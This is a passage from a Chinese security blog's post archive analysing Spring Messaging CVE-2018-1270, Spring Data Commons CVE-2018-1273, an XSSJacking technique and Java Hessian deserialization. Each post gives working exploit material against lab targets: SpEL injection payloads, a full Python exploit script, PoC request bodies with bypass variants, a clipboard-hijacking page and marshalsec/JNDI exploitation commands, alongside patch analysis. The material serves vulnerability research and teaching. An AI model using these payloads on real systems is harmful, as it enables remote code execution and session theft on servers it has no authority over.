远程代码执行漏洞分析(CVE-2017-4971)","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"SpEL注入","slug":"SpEL注入","permalink":"https://www.mi1k7ea.com/tags/SpEL注入/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"浅析Spring Messaging之CVE-2018-1270","date":"2020-02-08T04:13:22.000Z","path":"2020/02/08/浅析Spring-Messaging之CVE-2018-1270/","text":"0x01 Spring MessagingSpring Messaging模块为集成Messaging API和消息协议提供支持，包括base、converter、core、handler、simp、support、tcp等模块，其上层协议是STOMP，底层通信基于SockJS。 几个模块简介如下： base：定义了消息Message、消息处理MessageHandler、发送消息MessageChannel；Message由两部分组成，即Header和Payload；MessageHandler是一个处理消息的约定，Spring Messaging提供了丰富的消息处理方式；MessageChannel表现为pipes-and-filters架构的管道。 converter：对消息转换提供支持。 core：提供消息的模板方法。 handler：处理模块。 simp：包含诸如STOMP协议的简单消息协议的通用支持。STOMP，Streaming Text Orientated Message Protocol，是流文本定向消息协议，是一种为MOM(Message Oriented Middleware，面向消息的中间件)设计的简单文本协议。它提供了一个可互操作的连接格式，允许STOMP客户端与任意STOMP消息代理(Broker)进行交互，类似于OpenWire(一种二进制协议)。由于其设计简单，很容易开发客户端，因此在多种语言和多种平台上得到广泛应用。其中最流行的STOMP消息代理是Apache ActiveMQ。 support：提供了Message的实现，及创建消息的MessageBuilder和获取消息头的MessageHeaderAccessor，还有各种不同的MessageChannel实现和channel interceptor支持。 tcp： 一方面提供了通过TcpOperations建立tcp connection、通过TcpConnectionHandler处理消息和通过TcpConnectionf发送消息的抽象及实现；另一方面包含了对基于Reactor的tcp 消息支持。 0x02 CVE-2018-1270 Spring框架中通过spring-messaging模块来实现STOMP（Simple Text-Orientated Messaging Protocol），STOMP是一种封装WebSocket的简单消息协议。攻击者可以通过建立WebSocket连接并发送一条消息造成远程代码执行。 具体地说，在Spring Messaging中，其允许客户端订阅消息，并使用selector过滤消息。其中selector用SpEL表达式编写，并使用StandardEvaluationContext解析，从而导致SpEL表达式注入漏洞。 影响版本 Spring Framework 5.0 to 5.0.4 Spring Framework 4.3 to 4.3.14 Older unsupported versions are also affected 环境搭建参考Vulhub：https://vulhub.org/#/environments/spring/CVE-2018-1270/ 漏洞复现Method1访问页面，打开F12看到存在app.js文件，其中connect()函数用于建立SockJS连接： 这里直接篡改app.js的内容，插入恶意selector代码： 123456789101112function connect() &#123; var header = &#123;\"selector\":\"T(java.lang.Runtime).getRuntime().exec('touch /tmp/mi1k7ea')\"&#125;; var socket = new SockJS('/gs-guide-websocket'); stompClient = Stomp.over(socket); stompClient.connect(&#123;&#125;, function (frame) &#123; setConnected(true); console.log('Connected: ' + frame); stompClient.subscribe('/topic/greetings', function (greeting) &#123; showGreeting(JSON.parse(greeting.body).content); &#125;,header); &#125;);&#125; 此时在Web界面点击Connect再随便Send几个字符，就能成功触发漏洞： Method2使用Burp抓包，点击Connect，拦截到如下WebSocket报文： 篡改报文内容如下： 1[&quot;SUBSCRIBE\\nid:sub-0\\ndestination:/topic/greetings\\nselector:T(java.lang.Runtime).getRuntime().exec(&apos;touch /tmp/mi1k7ea&apos;)\\n\\n\\u0000&quot;] 再随便输入内容Send，然后就能触发了。 Method3使用P神的脚本就好：https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#!/usr/bin/env python3import requestsimport randomimport stringimport timeimport threadingimport loggingimport sysimport jsonlogging.basicConfig(stream=sys.stdout, level=logging.INFO)def random_str(length): letters = string.ascii_lowercase + string.digits return ''.join(random.choice(letters) for c in range(length))class SockJS(threading.Thread): def __init__(self, url, *args, **kwargs): super().__init__(*args, **kwargs) self.base = f'&#123;url&#125;/&#123;random.randint(0, 1000)&#125;/&#123;random_str(8)&#125;' self.daemon = True self.session = requests.session() self.session.headers = &#123; 'Referer': url, 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)' &#125; self.t = int(time.time()*1000) def run(self): url = f'&#123;self.base&#125;/htmlfile?c=_jp.vulhub' response = self.session.get(url, stream=True) for line in response.iter_lines(): time.sleep(0.5) def send(self, command, headers, body=''): data = [command.upper(), '\\n'] data.append('\\n'.join([f'&#123;k&#125;:&#123;v&#125;' for k, v in headers.items()])) data.append('\\n\\n') data.append(body) data.append('\\x00') data = json.dumps([''.join(data)]) response = self.session.post(f'&#123;self.base&#125;/xhr_send?t=&#123;self.t&#125;', data=data) if response.status_code != 204: logging.info(f\"send '&#123;command&#125;' data error.\") else: logging.info(f\"send '&#123;command&#125;' data success.\") def __del__(self): self.session.close()sockjs = SockJS('http://your-ip:8080/gs-guide-websocket')sockjs.start()time.sleep(1)sockjs.send('connect', &#123; 'accept-version': '1.1,1.0', 'heart-beat': '10000,10000'&#125;)sockjs.send('subscribe', &#123; 'selector': \"T(java.lang.Runtime).getRuntime().exec('touch /tmp/mi1k7ea')\", 'id': 'sub-0', 'destination': '/topic/greetings'&#125;)data = json.dumps(&#123;'name': 'vulhub'&#125;)sockjs.send('send', &#123; 'content-length': len(data), 'destination': '/app/hello'&#125;, data) 要在Python3环境下才能运行： 之后到服务端就看到命令被成功执行了。 漏洞分析有个注意的地方，如P神说的： 网上大部分文章都说spring messaging是基于websocket通信，其实不然。spring messaging是基于sockjs（可以理解为一个通信协议），而sockjs适配多种浏览器：现代浏览器中使用websocket通信，老式浏览器中使用ajax通信。 连接后端服务器的流程，可以理解为： 用STOMP协议将数据组合成一个文本流 用sockjs协议发送文本流，sockjs会选择一个合适的通道：websocket或xhr(http)，与后端通信 这里就不具体调试分析了，只简单分析下漏洞点，具体的调试分析可参考网上的一些文档即可。 从补丁的文件开始分析，即spring-messaging/src/main/java/org/springframework/messaging/simp/broker/DefaultSubscriptionRegistry.java，关键在于addSubscriptionInternal()函数，这里对header参数进行了接收和处理，其中会获取header中的selector，当selector不为空时则设置到expression中： 123456789101112131415161718192021222324@Overrideprotected void addSubscriptionInternal( String sessionId, String subsId, String destination, Message&lt;?&gt; message) &#123; Expression expression = null; MessageHeaders headers = message.getHeaders(); String selector = SimpMessageHeaderAccessor.getFirstNativeHeader(getSelectorHeaderName(), headers); if (selector != null) &#123; try &#123; expression = this.expressionParser.parseExpression(selector); this.selectorHeaderInUse = true; if (logger.isTraceEnabled()) &#123; logger.trace(\"Subscription selector: [\" + selector + \"]\"); &#125; &#125; catch (Throwable ex) &#123; if (logger.isDebugEnabled()) &#123; logger.debug(\"Failed to parse selector: \" + selector, ex); &#125; &#125; &#125; this.subscriptionRegistry.addSubscription(sessionId, subsId, destination, expression); this.destinationCache.updateAfterNewSubscription(destination, sessionId, subsId);&#125; 通过sessionId和subsId确定一个selector属性，后续服务端就通过这个subsId来查找特定会话，也就是从headers头部信息查找selector，由selector的值作为expression被执行 前面这是Subscribe操作时设置的selector，我们知道漏洞的触发是在Send之后，接着看下Send之后的函数调用。 看到org\\springframework\\messaging\\simp\\broker\\SimpleBrokerMessageHandler.java，其中有个sendMessageToSubscribers()函数，即将我们要发送的数据发送给订阅者，其中参数message保存了此次连接的相关信息，message的头部信息包含了selector的属性，调用了findSubscriptions()函数： 1234protected void sendMessageToSubscribers(@Nullable String destination, Message&lt;?&gt; message) &#123; MultiValueMap&lt;String,String&gt; subscriptions = this.subscriptionRegistry.findSubscriptions(message); ...&#125; 我们跟进查看findSubscriptions()函数，位于org/springframework/messaging/simp/broker/AbstractSubscriptionRegistry.java中，这里将message传进来findSubscriptionsInternal()函数中： 12345@Overridepublic final MultiValueMap&lt;String, String&gt; findSubscriptions(Message&lt;?&gt; message) &#123; ... return findSubscriptionsInternal(destination, message);&#125; 跟进findSubscriptionsInternal()函数，位于org\\springframework\\messaging\\simp\\broker\\DefaultSubscriptionRegistry.java中，这里将message传入了filterSubscriptions()函数进行处理： 12345@Overrideprotected MultiValueMap&lt;String, String&gt; findSubscriptionsInternal(String destination, Message&lt;?&gt; message) &#123; MultiValueMap&lt;String, String&gt; result = this.destinationCache.getSubscriptions(destination, message); return filterSubscriptions(result, message);&#125; 跟进filterSubscriptions()函数，同样在DefaultSubscriptionRegistry.java中定义了，该函数获取前面配置的selector来对subscriptions进行过滤选择，如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344private MultiValueMap&lt;String, String&gt; filterSubscriptions( MultiValueMap&lt;String, String&gt; allMatches, Message&lt;?&gt; message) &#123; if (!this.selectorHeaderInUse) &#123; return allMatches; &#125; EvaluationContext context = null; MultiValueMap&lt;String, String&gt; result = new LinkedMultiValueMap&lt;&gt;(allMatches.size()); for (String sessionId : allMatches.keySet()) &#123; for (String subId : allMatches.get(sessionId)) &#123; SessionSubscriptionInfo info = this.subscriptionRegistry.getSubscriptions(sessionId); if (info == null) &#123; continue; &#125; Subscription sub = info.getSubscription(subId); if (sub == null) &#123; continue; &#125; Expression expression = sub.getSelectorExpression(); if (expression == null) &#123; result.add(sessionId, subId); continue; &#125; if (context == null) &#123; context = new StandardEvaluationContext(message); context.getPropertyAccessors().add(new SimpMessageHeaderPropertyAccessor()); &#125; try &#123; if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) &#123; result.add(sessionId, subId); &#125; &#125; catch (SpelEvaluationException ex) &#123; if (logger.isDebugEnabled()) &#123; logger.debug(\"Failed to evaluate selector: \" + ex.getMessage()); &#125; &#125; catch (Throwable ex) &#123; logger.debug(\"Failed to evaluate selector\", ex); &#125; &#125; &#125; return result;&#125; 分析得知，通过Expression expression = sub.getSelectorExpression();来获取前面订阅时设置的Selector表达式，然后在if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class)))代码中调用了expression.getValue()函数，这就是漏洞触发点，成功触发了SpEL表达式注入漏洞。 补丁分析官方补丁：https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#diff-ca84ec52e20ebb2a3732c6c15f37d37a 可以看到主要是修改了DefaultSubscriptionRegistry这个类，用SimpleEvaluationContext来替代了StandardEvaluationContext，也就是采用了SpEL表达式注入漏洞的通用防御方法。 0x03 参考spring源码分析之spring-messaging模块详解 IDEA动态调试分析Spring RCE CVE-2018-1270 spring-messaging Remote Code Execution 分析-【CVE-2018-1270】","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"SpEL注入","slug":"SpEL注入","permalink":"https://www.mi1k7ea.com/tags/SpEL注入/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"浅析Spring Data Commons之CVE-2018-1273","date":"2020-02-03T13:11:16.000Z","path":"2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/","text":"0x01 Spring Data CommonsSpring Data是一个用于简化数据库访问，并支持云服务的开源框架，其主要目标是使数据库的访问变得方便快捷。 Spring Data Commons是Spring Data下所有子项目共享的基础框架。 0x02 CVE-2018-1273Spring Data Commons在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。 影响版本 2.0.x users should upgrade to 2.0.6 1.13.x users should upgrade to 1.13.11 Older versions should upgrade to a supported branch 环境搭建直接用Vulhub的即可：https://vulhub.org/#/environments/spring/CVE-2018-1273/ 漏洞复现访问目标站点/users接口，是个提交用户名和密码的注册用户的表单，且会在页面中显示出来： 提交该表单是如下POST请求： 将POST的内容修改为如下PoC再次发送： 1username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch /tmp/mi1k7ea&quot;)]=&amp;password=&amp;repeatedPassword= 此时服务端执行了恶意命令，文件创建成功： 其他一些可用的PoC 12345// 使用JavaScript引擎绕过username[#this.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;js&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;touch /tmp/hacked&apos;)&quot;)]=&amp;password=&amp;repeatedPassword=// 使用ProcessBuilderusername[(#root.getClass().forName(&quot;java.lang.ProcessBuilder&quot;).getConstructor(&apos;foo&apos;.split(&apos;&apos;).getClass()).newInstance(&apos;touchxx/tmp/niubi&apos;.split(&apos;xx&apos;))).start()]=&amp;password=&amp;repeatedPassword= 漏洞分析先来看下漏洞点，下载Spring Data Commons 2.0.5的源码分析。 漏洞代码位于org.springframework.data.web.MapDataBinder类中的setPropertyValue()函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/* * (non-Javadoc)* @see org.springframework.beans.AbstractPropertyAccessor#setPropertyValue(java.lang.String, java.lang.Object)*/@Overridepublic void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException &#123; if (!isWritableProperty(propertyName)) &#123; throw new NotWritablePropertyException(type, propertyName); &#125; StandardEvaluationContext context = new StandardEvaluationContext(); context.addPropertyAccessor(new PropertyTraversingMapAccessor(type, conversionService)); context.setTypeConverter(new StandardTypeConverter(conversionService)); context.setTypeLocator(typeName -&gt; &#123; throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName); &#125;); context.setRootObject(map); Expression expression = PARSER.parseExpression(propertyName); PropertyPath leafProperty = getPropertyPath(propertyName).getLeafProperty(); TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType(); TypeInformation&lt;?&gt; propertyType = leafProperty.getTypeInformation(); propertyType = propertyName.endsWith(\"]\") ? propertyType.getActualType() : propertyType; if (propertyType != null &amp;&amp; conversionRequired(value, propertyType.getType())) &#123; PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment()); if (descriptor == null) &#123; throw new IllegalStateException(String.format(\"Couldn't find PropertyDescriptor for %s on %s!\", leafProperty.getSegment(), owningType.getType())); &#125; MethodParameter methodParameter = new MethodParameter(descriptor.getReadMethod(), -1); TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, 0); if (typeDescriptor == null) &#123; throw new IllegalStateException( String.format(\"Couldn't obtain type descriptor for method parameter %s!\", methodParameter)); &#125; value = conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor); &#125; try &#123; expression.setValue(context, value); &#125; catch (SpelEvaluationException o_O) &#123; throw new NotWritablePropertyException(type, propertyName, \"Could not write property!\", o_O); &#125;&#125; 上述代码的流程为： 首先通过isWritableProperty()函数校验propertyName参数（来自表单提交的参数），检测是否为Controller中设置的Form映射对象中的成员变量； 然后创建一个StandardEvaluationContext，同时调用PARSER.parseExpression()设置需要解析的表达式的值为函数传入的参数； 最后调用expression.setValue()进行SpEL表达式解析； 接着跟踪isWritableProperty()函数，查看是如何过滤propertyName参数的，其最终是调用的getPropertyPath()函数： 12345private PropertyPath getPropertyPath(String propertyName) &#123; String plainPropertyPath = propertyName.replaceAll(\"\\\\[.*?\\\\]\", \"\"); return PropertyPath.from(plainPropertyPath, type);&#125; 这里是通过正则将包括中括号在内的内容给替换为空，然后判断剩下的内容是否为type里的属性。这里type就是在Controller处用到的用于接收参数的类。 因此，我们可以用这个类的一个字段再加上[payload]来构造恶意的SpEL表达式就可以实现RCE了。 还有一个坑，就是下面这段代码： 123context.setTypeLocator(typeName -&gt; &#123; throw new SpelEvaluationException(SpelMessage.TYPE_NOT_FOUND, typeName);&#125;); 这是Spring Data Commons 2.0.5版本中添加的用来拒绝SpEL表达式的。这里如果直接使用T(java.lang.Runtime).getRuntime().exec(&#39;calc.exe&#39;)这样的原始payload是不会成功触发的，但是可以像前面复现那样利用反射来绕过。 接着我们看下外部参数是通过那个Controller进来的。 代码位置为：https://github.com/spring-projects/spring-data-examples/blob/master/web/example/src/main/java/example/users/web/UserController.java#L83 这是Controller的代码，register()函数支持POST方式获取用户表单参数数据，这其中就有UserForm、BindingResult、Model： 12345678910111213141516171819202122232425/*** Registers a new &#123;@link User&#125; for the data provided by the given &#123;@link UserForm&#125;. Note, how an interface is used to* bind request parameters.** @param userForm the request data bound to the &#123;@link UserForm&#125; instance.* @param binding the result of the binding operation.* @param model the Spring MVC &#123;@link Model&#125;.* @return*/@RequestMapping(method = RequestMethod.POST)public Object register(UserForm userForm, BindingResult binding, Model model) &#123; userForm.validate(binding, userManagement); if (binding.hasErrors()) &#123; return \"users\"; &#125; userManagement.register(new Username(userForm.getUsername()), Password.raw(userForm.getPassword())); RedirectView redirectView = new RedirectView(\"redirect:/users\"); redirectView.setPropagateQueryParams(true); return redirectView;&#125; 现在问题是这段Controller代码是怎么和漏洞类MapDataBinder关联起来的。 看廖新喜大佬的博客，说是Form表单的提交操作会调用到ProxyingHandlerMethodArgumentResolver，而ProxyingHandlerMethodArgumentResolver中使用了MapDataBinder的接口，从而使之触发。 ProxyingHandlerMethodArgumentResolver中使用MapDataBinder的代码如下： 12345678910111213/* * (non-Javadoc)* @see org.springframework.web.method.annotation.ModelAttributeMethodProcessor#createAttribute(java.lang.String, org.springframework.core.MethodParameter, org.springframework.web.bind.support.WebDataBinderFactory, org.springframework.web.context.request.NativeWebRequest)*/@Overrideprotected Object createAttribute(String attributeName, MethodParameter parameter, WebDataBinderFactory binderFactory, NativeWebRequest request) throws Exception &#123; MapDataBinder binder = new MapDataBinder(parameter.getParameterType(), conversionService.getObject()); binder.bind(new MutablePropertyValues(request.getParameterMap())); return proxyFactory.createProjection(parameter.getParameterType(), binder.getTarget());&#125; ProxyingHandlerMethodArgumentResolver实现了 BeanFactoryAware和BeanClassLoaderAware，所以是在Bean装配后被自动调用的。 具体的Controller到MapDataBinder类触发的过程及原理分析可参考： https://github.com/iflody/myBugAnalyze/blob/master/2018/CVE-2018-1273/README.md https://trex-tbag.github.io/2018/04/14/spring-data-common-cve/ 补丁分析看下Spring Data Commons 2.0.6版本的官方补丁是如何修复的：https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653 其实就是使用了SpEL表达式注入漏洞的通用修补方法，即将StandardEvaluationContext替代为SimpleEvaluationContext，由于StandardEvaluationContext权限过大，可以执行任意代码，会被恶意用户利用。 SimpleEvaluationContext的权限则小的多，只支持一些Map结构，通用的jang.lang.Runtime、java.lang.ProcessBuilder等都已经不再支持，这样也就成功防御了SpEL表达式注入漏洞。 0x03 参考Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】 CVE-2018-1273: RCE with Spring Data Commons 分析和利用","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"SpEL注入","slug":"SpEL注入","permalink":"https://www.mi1k7ea.com/tags/SpEL注入/"},{"name":"Spring","slug":"Spring","permalink":"https://www.mi1k7ea.com/tags/Spring/"}]},{"title":"浅析XSSJacking","date":"2020-01-26T07:49:05.000Z","path":"2020/01/26/浅析XSSJacking/","text":"0x00 参考主要是参考学习了这篇文章的姿势：一种结合了点击劫持、Self-XSS、复制粘贴劫持的新型XSS攻击 0x01 XSSJacking简介XSSJacking即XSS劫持，是一种另类的XSS利用方式。具体的说，就是结合Self-XSS、ClickJacking、复制粘贴劫持等漏洞进行组合利用，提高Self-XSS漏洞危害程序。 Self-XSS(自跨站脚本攻击)是一种由受害者自己输入XSS payload触发才能成功的XSS攻击行为，这种攻击可基于DOM，或是建立在仅该用户可操作或可见的域。 ClickJacking即点击劫持，是指在一个Web页面下隐藏了一个透明的iframe（opacity：0），用外层假页面诱导用户点击，实际上是在隐藏的frame上触发了点击事件进行一些用户不知情的操作。通常是因为目标服务器未设置X-Frame-Options头或未安全设置该头导致存在ClickJacking漏洞的。 复制粘贴劫持，就是在诱使用户进行复制粘贴操作时，会进行一些恶意的操作。 利用场景目标站点某个页面存在Self-XSS，并且目标站点存在ClickJacking漏洞，此时这种攻击就能派上用场了。 目标站点存在Self-XSSxssjacking.html，存在Self-XSS的页面，需要引入angular.min.js和main.js，主要是有一个文本输入框，其中ng-change指令的作用是当输入框的值改变时执行函数，ng-model指令可以将输入域的值与 AngularJS 创建的变量绑定。： 1234567891011&lt;html&gt; &lt;head&gt; &lt;script src=\"angular.min.js\"&gt;&lt;/script&gt; &lt;script src=\"main.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body ng-app=\"xssApp\" ng-controller=\"mainController\"&gt; &lt;h1&gt; &lt;/h1&gt; &lt;textarea placeholer=\"Vulnerable to XSS\" ng-model=\"textArea\" ng-change=\"checkForAlert(textArea)\" style=\"height:100%; width:100%;\"&gt; &lt;/textarea&gt; &lt;/body&gt;&lt;/html&gt; main.js代码如下，模拟的输入&lt;script&gt;alert(document.cookie)&lt;/script&gt;即可X自己，这里需要AngularJS的支持： 12345678var redisApp = angular.module('xssApp', []);redisApp.controller('mainController', ['$scope', function($scope) &#123; $scope.checkForAlert = function(text)&#123; if(text == \"&lt;script&gt;alert(document.cookie)&lt;/script&gt;\")&#123; alert(document.cookie); &#125; &#125;&#125;]); 这个页面就是个文本输入界面，当用户自己输入XSS payload时就会弹框： 目标站点存在ClickJacking我们查看响应，发现目标站点并未设置X-Frame-Options头，即存在ClickJacking漏洞： 接着，攻击者可以编写如下PoC： 1234567891011121314151617181920212223&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; Enter your email below to register: &lt;/br&gt; &lt;textarea autofocus style=\"width:220px; height:35px;\"&gt;&lt;/textarea&gt; &lt;/br&gt; Repeat your email: &lt;/br&gt; &lt;iframe style=\"width:230px; height:50px;\" frameBorder=\"0\" src=\"xssjacking.html\"&gt;&lt;/iframe&gt; &lt;/br&gt; &lt;input type=\"submit\"&gt;&lt;/input&gt; &lt;script&gt; document.addEventListener('copy', function(e)&#123; console.log(e); // e.clipboardData.setData('text/plain', '\\x3cscript\\x3ealert(document.cookie)\\x3c/script\\x3e'); e.preventDefault(); // We want our data, not data from any selection, to be written to the clipboard &#125;); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 简单地说，该恶意页面表面是输入邮箱和验证邮箱的表单，实际是通过iframe标签引入隐藏的页面即存在Self-XSS漏洞的页面，其中页面通过JS实现复制粘贴劫持攻击，当用户在该页面进行粘贴操作时其中的内容就会被替换为Self-XSS的payload，也就是说实际上是在Self-XSS页面中输入了XSS payload。 比如，已在目标站点登录获得cookie的用户被诱使访问了该恶意页面，输入邮箱之后，当再次输入验证邮箱时，用户通常会直接对前面输入的邮箱进行复制然后粘贴到下面验证的输入框中，此时就会触发Self-XSS弹框： 至此，攻击者就能通过钓鱼的手段结合ClickJacking、Self-XSS和复制粘贴劫持等漏洞实现窃取受害者的cookie等敏感信息。 小结个人觉得就是利用ClickJacking和复制粘贴实现Self-XSS的利用，扩大Self-XSS的危害程序，使其和常规的XSS一样存在高风险。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]},{"title":"Java Hessian反序列化漏洞","date":"2020-01-25T00:46:52.000Z","path":"2020/01/25/Java-Hessian反序列化漏洞/","text":"0x01 Hessian简介Hessian是一个轻量级的remoting onhttp工具，是一个轻量级的Java序列化/反序列化框架，使用简单的方法提供了RMI的功能。 相比WebService，Hessian更简单、快捷。采用的是二进制RPC协议，因为采用的是二进制协议，所以它很适合于发送二进制数据。 Hessian序列化/反序列化机制的基本概念图如下： AbstractSerializerFactory：抽象序列化器工厂，是管理和维护对应序列化/反序列化机制的工厂，拥有getSerializer()和getDeserializer()方法。默认的几种实现如下： SerializerFactory：标准的实现。 ExtSerializerFactory：可以设置自定义的序列化机制，通过该Factory可以进行扩展。 BeanSerializerFactory：对SerializerFactory的默认Object的序列化机制进行强制指定，指定为BeanSerializer。 Serializer：序列化的接口，拥有writeObject()方法。 Deserializer：反序列化的接口，拥有readObject()、resdMap()、readList()方法。 AbstractHessianInput：Hessian自定义的输入流，提供对应的read各种类型的方法。 AbstractHessianOutput：Hessian自定义的输出流，提供对应的write各种类型的方法。 在Hessian的Serializer中，有以下几种默认实现的序列化器： 在Hessian的Deserializer中，有以下几种默认实现的反序列化器： 这里我们关注到MapDeserializer这个反序列化器即可，其在后面的反序列化漏洞利用中应用到。 0x02 Hessian反序列化漏洞和Java原生的序列化对比，Hessian更加高效并且非常适合二进制数据传输。既然是一个序列化/反序列化框架，Hessian同样存在反序列化漏洞的问题。 对于Hessian反序列化漏洞的利用，使用ysoserial工具的Gadget是无法成功的，而是要用marshalsec工具的Gadget。这是因为ysoserial是针对Java原生反序列化漏洞的，并没有一些如Hessian等非Java原生反序列化漏洞的Gadgets。 marshalsec工具项目如下：https://github.com/mbechler/marshalsec 针对Hessian反序列化过程进行攻击，就需要使用特殊的Gadget，在marshalsec这个工具里，已经有了5个可用的Gadgets。分别是： Rome XBean Resin SpringPartiallyComparableAdvisorHolder SpringAbstractBeanFactoryPointcutAdvisor 复现——Resin GadgetHessian环境搭建按照参考文章很方便就搞好。 和JNDI注入时一样，现在要搭建恶意的JNDI服务端，这里直接用JNDI注入利用工具项目而不用像之前一样自己写服务端代码：https://github.com/welk1n/JNDI-Injection-Exploit 使用方法如下，-C参数为需要执行的命令，-A参数为监听地址： 1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address] 这里我们用直接启动就行，可以看到是有三个不同的服务端对应不同的端口： 直接用marshalsec来生成payload，这里地址指定为JettyServer并在指定恶意执行类为ExecTemplateJDK7： 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Resin http://127.0.0.1:8180/ ExecTemplateJDK7&gt;hessian 最后就是编写序列化的payload发送到服务器，这里直接看下原作者的脚本是怎么写的： 12345678910111213141516171819202122232425262728293031h#!/usr/bin/env python# coding=utf-8# code by 21superman# Date 2018年12月28日import requestsimport argparsedef load(name): header=b'\\x63\\x02\\x00\\x48\\x00\\x04'+'test' with open(name,'rb') as f: return header+f.read()def send(url,payload): #proxies = &#123;'http':'127.0.0.1:8888'&#125; headers=&#123;'Content-Type':'x-application/hessian'&#125; data=payload res=requests.post(url,headers=headers,data=data) return res.textdef main(): parser = argparse.ArgumentParser() parser.add_argument(\"-u\", help=\"hessian site url eg.http://127.0.0.1:8080/HessianTest/hessian\") parser.add_argument(\"-p\",help=\"payload file\") args = parser.parse_args() if args.u==None or args.p==None: print('eg. python hessian.py -u http://127.0.0.1:8080/HessianTest/hessian -p hessian') else: send(args.u, load(args.p))if __name__ == '__main__': main() #load('hessian') 先是将marshalsec生成的payload和构造的header拼接成Hessian格式的序列化内容，然后通过POST方式发送该Hessian序列化的内容，其中需要指定Content-Type头为’x-application/hessian’让服务端识别出事Hessian序列化类型的数据。 运行脚本，成功触发反序列化漏洞： 1python hessian.py -u http://127.0.0.1:8080/HessianTest/hessian -p hessian Resin Gadget分析调试分析之前，我们需要知道marshalsec中Resin Gadget到底是如何触发反序列化漏洞RCE的。 我们看下Gadget怎么写的：https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/Resin.java 123456789101112131415161718192021222324252627282930313233343536373839404142434445package marshalsec.gadgets;import java.lang.reflect.Constructor;import java.util.Hashtable;import javax.naming.CannotProceedException;import javax.naming.Reference;import javax.naming.directory.DirContext;import com.caucho.naming.QName;import marshalsec.MarshallerBase;import marshalsec.UtilFactory;import marshalsec.util.Reflections;/** * @author mbechler * */public interface Resin extends Gadget &#123; @Args ( minArgs = 2, args = &#123; \"codebase\", \"class\" &#125;, defaultArgs = &#123; MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass &#125; ) default Object makeResinQName ( UtilFactory uf, String[] args ) throws Exception &#123; Class&lt;?&gt; ccCl = Class.forName(\"javax.naming.spi.ContinuationDirContext\"); //$NON-NLS-1$ Constructor&lt;?&gt; ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class); ccCons.setAccessible(true); CannotProceedException cpe = new CannotProceedException(); Reflections.setFieldValue(cpe, \"cause\", null); Reflections.setFieldValue(cpe, \"stackTrace\", null); cpe.setResolvedObj(new Reference(\"Foo\", args[ 1 ], args[ 0 ])); Reflections.setFieldValue(cpe, \"suppressedExceptions\", null); DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable&lt;&gt;()); QName qName = new QName(ctx, \"foo\", \"bar\"); return uf.makeToStringTriggerStable(qName); &#125;&#125; 分析可知： 先定义了javax.naming.spi.ContinuationDirContext类实例，然后调用getDeclaredConstructor()函数生成CannotProceedException类和Hashtable类的结构体实例，用于构造后面的DirContext类实例并通过构造函数赋值给QName类实例的_context属性。 然后定义了一个CannotProceedException类变量cpe，该类用于程序出现异常时通过调用javax.naming.spi.NamingManager提供的方法（比如 getContinuationContext()）来查找另一个提供程序以继续操作；这里调用了setResolvedObj()函数设置此异常的已解析对象字段为恶意的Reference类实例，可以看到是Reference()的classFactoryLocation参数的JNDI注入利用，注意该Reference最后是传入到QName构造函数的第一个参数中。 接着，将设置好的cpe传入DirContext的newInstance()函数中新建实例。 最后定义了com.caucho.naming.QName这个类实例，再调用makeToStringTriggerStable()函数处理该对象并返回。 接着跟踪makeToStringTriggerStable()函数的实现，根本是调用的ToStringUtil.makeToStringTrigger()函数： 12345public static Object makeToStringTrigger ( Object o ) throws Exception &#123; String unhash = unhash(o.hashCode()); XString xString = new XString(unhash); return JDKUtil.makeMap(o, xString);&#125; 分析可知，用到了com.sun.org.apache.xpath.internal.objects.XString这个类来和QName对象生成并返回一个Map对象。使用这个处理的目的是为了调用到QName.toString()函数。 